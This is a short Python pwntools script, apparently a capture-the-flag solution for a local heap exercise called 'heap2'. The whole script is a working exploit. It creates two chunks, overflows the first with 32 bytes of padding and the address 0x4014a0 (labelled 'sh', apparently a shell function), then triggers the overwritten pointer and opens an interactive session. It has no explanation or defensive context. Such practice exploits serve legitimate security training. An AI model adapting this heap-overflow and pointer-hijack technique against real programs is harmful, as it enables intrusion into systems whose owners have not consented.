
from pwn import *

sh = 0x4014a0


def fun_add(r):
    r.recvuntil('size: ')
    r.sendline('4')
    r.recvuntil('content: ')
    r.sendline('AAAA')


def fun_edit(r):
    r.recvuntil('Index: ')
    r.sendline('0')
    # 24+8
    p = b'A' * 32 + p64(sh)
    r.sendline(p)


r = process('./pwn/heap/heap-2/heap2')

r.recvuntil('Choice: ')
r.sendline('1')
fun_add(r)
r.recvuntil('Choice: ')
r.sendline('1')
fun_add(r)
r.recvuntil('Choice: ')
r.sendline('2')
fun_edit(r)
r.recvuntil('Choice: ')
#print memes[1]
r.sendline('3')
#index 1 (the second meme)
r.recvuntil('Index: ')
r.sendline('1')

r.interactive()